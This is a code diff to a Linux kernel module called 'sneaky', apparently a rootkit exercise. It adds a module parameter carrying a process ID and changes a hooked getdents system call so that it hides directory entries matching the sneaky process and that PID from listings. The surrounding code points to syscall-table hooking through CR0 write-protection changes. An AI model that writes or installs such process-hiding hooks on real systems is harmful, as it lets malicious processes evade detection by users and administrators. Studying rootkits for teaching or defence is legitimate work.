@@ -1,6 +1,8 @@
 #include <linux/module.h>      // for all modules 
+#include <linux/moduleparam.h>
 #include <linux/init.h>        // for entry/exit macros 
-#include <linux/kernel.h>      // for printk and other kernel bits 
+#include <linux/kernel.h>      // for printk and other kernel bits
+#include <linux/stat.h>
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
@@ -19,6 +21,10 @@
 /* #include <sys/syscall.h> */
 /* #include <string.h> */
 
+//----------------------arguments from parent-----------------------
+static char *sneaky_process_pid = "";
+module_param(sneaky_process_pid, charp, 0);
+MODULE_PARM_DESC(sneaky_process_pid, "sneaky process pid");
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -105,7 +111,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
 
 
     if (strcmp(d->d_name, "sneaky_process") == 0 ||
-	strcmp(d->d_name, "sneaky_process_id") == 0) {
+	strcmp(d->d_name, sneaky_process_pid) == 0) {
 
       int dirent_len = d->d_reclen;
       char* src = (char *) d + d->d_reclen;
